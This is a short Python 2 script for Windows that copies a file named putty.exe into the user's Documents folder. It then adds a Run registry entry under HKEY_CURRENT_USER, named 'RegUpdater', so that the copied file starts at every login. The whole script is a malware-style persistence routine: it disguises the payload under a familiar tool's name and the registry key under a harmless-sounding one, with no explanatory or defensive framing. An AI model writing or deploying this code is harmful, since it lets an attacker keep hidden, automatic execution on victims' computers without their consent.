import os
import shutil
from subprocess import check_output
import _winreg as wreg

path = os.getcwd().strip('\n')
Null, userprof = check_output('set USERPROFILE', shell=True).split('=')
destination = userprof.strip('\n\r') + '\\Documents\\' + 'putty.exe'

if not os.path.exists(destination):
    shutil.copyfile(path + '\putty.exe', destination)
    key = wreg.OpenKey(wreg.HKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Run",0,wreg.KEY_ALL_ACCESS)
    wreg.SetValueEx(key, 'RegUpdater',0,wreg.REG_SZ, destination)
    key.close()

